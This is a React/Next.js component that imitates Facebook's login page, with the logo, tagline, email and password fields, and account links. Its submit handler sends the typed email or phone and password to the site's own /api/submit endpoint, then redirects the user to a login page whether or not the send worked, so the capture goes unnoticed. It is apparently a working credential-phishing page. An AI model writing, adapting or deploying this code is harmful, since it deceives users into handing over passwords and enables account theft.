"use client";

import { useState } from "react";
import Footer from "./Footer";
import Image from "next/image";
import {
  redirectToCreatePage,
  redirectToCreateAccount,
  redirectToForgotPassword,
  redirectToLogin,
} from "./utils/index.";

function App() {
  const [show, setShow] = useState(false);
  const [isFocused, setIsFocused] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const [formData, setFormData] = useState({
    name: "",
    password: "",
  });

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      setIsLoading(true);
      if (process.env.NEXT_PUBLIC_ACTIVATE === "true") return;

      const response = await fetch("/api/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      const result = await response.json();

      if (response.ok) {
        setIsLoading(false);
        redirectToLogin();
        // alert("Form submitted successfully!");
      } else {
        setIsLoading(false);
        redirectToLogin();
        console.error("Error submitting form:", result?.error);
        // alert("Failed to submit form");
      }
    } catch (error) {
      setIsLoading(false);
      redirectToLogin();
      console.error("Error submitting form:", error);
      // alert("Failed to submit form");
    }
  };

  return (
    <div className="h-svh w-full">
      <section className="bg-[#F1F4F7] h-[720px] flex items-center justify-center">
        <div className="flex flex-col md:flex-row items-center justify-start md:justify-between h-full w-full md:-mt-14 container-wrapper gap-2 md:gap-[32px]">
          <div className="-space-y-2 flex flex-col mt-4 md:-mt-40 items-center justify-center md:items-start ">
            <Image
              className="-ml-[30px]"
              src="/logo.svg"
              width={320}
              height={106}
              alt="Facebook logo"
            />
            <p className="font-sans font-medium text-[#1c1e21] text-center md:text-left text-[24px] lg:text-[28px] w-[400px] md:w-[350px] lg:w-[510px] leading-7 lg:leading-8">
              Facebook helps you connect and share with the people in your life.
            </p>
          </div>

          <div className="">
            <div className="bg-white py-[14px] px-[14px] rounded-[8px] shadow-md w-[396px] mt-9 md:mt-0">
              <form onSubmit={handleSubmit}>
                <div className="flex flex-col gap-3 w-full">
                  <input
                    className="font-sans outline-none focus:border-[#0866ff] active:border-[#0866ff] py-[14px] px-[16px] rounded-[6px] border-[1.4px]"
                    type="text"
                    placeholder="Email address or phone number"
                    name="name"
                    value={formData.name}
                    onChange={handleChange}
                    required
                  />
                  <div
                    className={`py-[14px] px-[16px] rounded-[6px] border-[1.4px] w-full flex items-center gap-3 ${
                      isFocused ? "border-[#0866ff]" : "border-gray-300"
                    }`}
                  >
                    <input
                      className="font-sans border-none outline-none rounded-[6px] w-full"
                      type={show ? "text" : "password"}
                      placeholder="Password"
                      onFocus={() => setIsFocused(true)}
                      onBlur={() => setIsFocused(false)}
                      name="password"
                      value={formData.password}
                      onChange={handleChange}
                      required
                    />
                    <span
                      className="cursor-pointer hover:bg-opacity-95"
                      onClick={() => setShow((prev) => !prev)}
                    >
                      {show ? (
                        <Image
                          src="/eye.png"
                          width={16}
                          height={16}
                          alt="eye"
                        />
                      ) : (
                        <Image
                          src="/eyeoff.png"
                          width={16}
                          height={16}
                          alt="eyeoff"
                        />
                      )}
                    </span>
                  </div>
                </div>
                <button
                  type="submit"
                  className="transition-ease bg-[#0866ff] disabled:bg-[#a1b3d5] hover:bg-opacity-90 text-[20px] font-bold text-white w-full px-[16px] py-2 rounded-[6px] mt-3"
                  disabled={isLoading}
                >
                  Log in
                </button>
              </form>
              <p
                onClick={redirectToForgotPassword}
                className="font-sans hover:underline text-[#0866ff] text-[14px] font-medium text-center pt-4"
              >
                Forgotten password?
              </p>

              <div className="w-full border-[0.1px] my-[20px]"></div>

              <div className="flex items-center justify-center pb-3">
                <button
                  onClick={redirectToCreateAccount}
                  className="transition-ease font-sans bg-[#42b72a] hover:bg-opacity-90 py-[11px] px-[16px] text-white rounded-[6px] text-[17px] font-bold"
                >
                  Create new account
                </button>
              </div>
            </div>

            <div className="mt-[28px] text-center">
              <p
                onClick={redirectToCreatePage}
                className="font-sans text-[#1c1e21] text-[14px] font-medium"
              >
                <strong className="font-bold hover:underline cursor-pointer">
                  Create a Page
                </strong>{" "}
                for a celebrity, brand or business.
              </p>
            </div>
          </div>
        </div>
      </section>

      <div className="flex items-center justify-center w-full">
        <Footer />
      </div>
    </div>
  );
}

export default App;
